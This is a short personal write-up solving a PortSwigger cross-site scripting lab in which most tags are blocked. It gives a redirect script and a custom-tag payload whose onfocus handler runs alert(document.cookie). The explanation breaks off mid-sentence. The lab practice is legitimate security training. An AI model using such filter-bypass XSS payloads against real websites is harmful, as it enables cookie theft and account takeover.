#portswigger #solution #xss

- **Category:** [[Cross-site scriping (XSS)]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
- **Date Solved:** 2026-08-19

This LAB blocked all default tags, I had to craft a custom tag by myself to exploit it.

My payload:

```html
<script>
location.href = "https://0a90000304a1a25880b53aa700540081.web-security-academy.net/?search=%3Crandom%20id=%22hack%22%20tabindex=%221%22%20onfocus=%22alert(document.cookie)%22%3E#hack"
</script>
```
My custom tag:
```html
<random id="hack" tabindex="1" onfocus="alert(1)">#hack>
```

Here's my idea behind it:
I created a custom tag that heritage some 